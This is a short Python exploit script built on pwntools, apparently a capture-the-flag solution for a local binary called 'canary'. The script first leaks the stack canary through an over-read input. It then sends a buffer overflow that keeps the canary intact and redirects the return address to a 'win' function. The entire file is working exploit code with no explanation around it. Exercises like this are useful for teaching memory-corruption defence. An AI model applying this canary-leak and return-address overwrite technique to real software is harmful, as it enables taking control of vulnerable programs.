#!/usr/bin/python3
 
from pwn import *

vuln = ELF("./canary")

p = process("./canary")

p.recvline()

pause()
payload = 0x18*b"2" + b"\n"
p.send(payload)

p.recvuntil(b"2222\n")
canary = b"\0" + p.recvn(7)
p.recvline()
info(f"{canary=}")

payload = 0x18 *b"A" + canary + 0x18*b"B" + p64(vuln.symbols["win"])
p.sendline(payload)

p.recvall()